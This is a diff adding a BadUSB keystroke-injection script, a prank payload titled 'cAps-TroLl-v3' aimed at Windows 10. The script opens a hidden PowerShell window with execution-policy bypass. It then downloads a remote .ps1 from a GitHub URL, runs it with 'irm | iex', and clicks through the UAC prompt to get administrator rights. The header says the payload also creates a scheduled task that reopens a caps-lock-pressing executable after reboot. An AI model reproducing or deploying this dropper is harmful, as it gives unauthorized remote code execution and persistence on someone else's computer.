@@ -1,0 +1,27 @@
+REM Title: cAps-TroLl-v3
+REM Author: @tobis137 | https://github.com/TobiS137
+REM Description: Downloads an exe file that periodically presses the caps-lock key, aswell as creating a windows task, that reopens this exe file on reboot and after 5 min when closed.
+REM Target: Windows 10
+
+REM *SETUP*
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+CTRL-ALT DELETE
+DELAY 100
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 750
+REM Script starts here - First inputs forces the system out of any potential VM's running other operating systems. 
+GUI r
+STRING powershell -w h -NoP -Ep Bypass -C "irm https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v4/cAps-TroLl-v4.ps1 | iex"
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+REM Script ends here - Remaining inputs close task manager after finishing script execution
+DELAY 300
+ALT TAB
+ALT F4
